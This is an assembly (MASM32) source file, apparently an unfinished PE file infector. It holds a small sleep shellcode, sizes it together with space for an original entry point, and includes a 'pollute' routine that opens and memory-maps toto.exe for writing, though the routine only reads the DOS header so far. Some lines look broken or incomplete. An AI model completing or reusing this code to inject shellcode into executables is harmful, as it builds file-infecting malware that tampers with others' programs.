.486
.model flat, stdcall
option casemap:none

include c:\masm32\include\windows.inc
include c:\masm32\include\kernel32.inc
include c:\masm32\include\user32.inc
include  c:\masm32\include\msvcrt.inc

includelib c:\masm32\lib\kernel32.lib
includelib c:\masm32\lib\user32.lib
includelib c:\masm32\lib\msvcrt.lib

.data

shellcode db 33h, 192, 66h, 184,37h, 13h, 50h , 184, 42h, 24h, 80h, 7ch,  255, 208,  233,0  ;shellcode sleep(4919)
onError db "Errorz", 13, 10, 0
onSuccess db "Success", 13, 10, 0


varPutInt db "int: %p",13,10, 0
filename db  "toto.exe", 0

.data?

;infosExecutable dd ? 
infosPE    dd ?
tailleSection dd ?
executableHandle HANDLE ?
executableMap HANDLE ?
executableEnMemoire LPVOID ?
infosExecutable IMAGE_DOS_HEADER  <>  

.code
	
start:

;long tailleSection = strlen(shellcode) + (sizeof(DWORD)); 
; taille du shellcode +  old entrypoint  
push offset shellcode
call crt_strlen
mov tailleSection , eax
add tailleSection, sizeof(DWORD)


push offset filename
call  pollute

exit:
invoke crt_printf,  offset onSuccess
invoke ExitProcess, 0

exiterror:
call GetLastError
invoke crt_printf, offset varPutInt, eax
invoke crt_printf,  offset onError
invoke ExitProcess, 1


pollute proc   filename1 : DWORD


invoke crt_printf, filename1

; Opens file for both read and write                                                                                                                                                                   
mov	eax, GENERIC_WRITE
or            eax, GENERIC_READ
invoke     CreateFile,  filename1, eax, 0, 0, OPEN_EXISTING, 0, 0
mov             executableHandle, eax 
cmp  eax,  INVALID_HANDLE_VALUE
je exiterror

; HANDLE executableMappe = CreateFileMapping(executableHandle , NULL , PAGE_READWRITE , 0  , 0 , NULL) 
 invoke CreateFileMapping,  executableHandle, 0, PAGE_READWRITE , 0  , 0 , 0
mov executableMap, eax
cmp  eax,  INVALID_HANDLE_VALUE
je exiterror
cmp eax, NULL
je exiterror

invoke  MapViewOfFile, executableMap, FILE_MAP_ALL_ACCESS , 0 , 0, 0
; LPVOID executableEnMemoire = MapViewOfFile(executableMappe , FILE_MAP_ALL_ACCESS , 0 ,  0, 0)
mov executableEnMemoire, eax
cmp eax, NULL
je exiterror

;mov eax, 0[executableEnMemoire]
;mov eax, [eax]
assume eax:ptr IMAGE_DOS_HEADER
mov infosExecutable.e_magic , ax 
invoke crt_printf,  offset varPutInt,  [eax].e_magic

invoke crt_printf,  offset varPutInt,  IMAGE_DOS_SIGNATURE


ret
pollute endp


end start